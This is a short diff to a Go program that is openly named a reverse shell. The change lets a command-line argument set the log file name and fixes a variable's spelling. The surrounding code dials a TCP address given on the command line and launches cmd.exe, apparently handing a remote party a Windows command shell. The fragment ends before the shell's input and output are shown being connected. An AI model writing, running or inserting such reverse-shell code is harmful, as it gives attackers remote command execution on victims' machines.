@@ -9,11 +9,17 @@ import (
 )
 
 func main() {
-	nameOfLogFIle := helpers.CreateLogFileIfItDoesNotExist("./", "ReverseShell")
+	var nameOfLogFile string
+	if len(os.Args) == 3 {
+		nameOfLogFile = os.Args[2]
+	} else {
+		nameOfLogFile = helpers.CreateLogFileIfItDoesNotExist("./", "ReverseShell", "ReverseShell")
+	}
+
 	connectString := os.Args[1]
 	conn, err := net.Dial("tcp", connectString)
 	if err != nil {
-		helpers.WriteLog(nameOfLogFIle, err.Error(), 1)
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, "ReverseShell")
 		os.Exit(2)
 	}
 	cmd := exec.Command("cmd.exe")
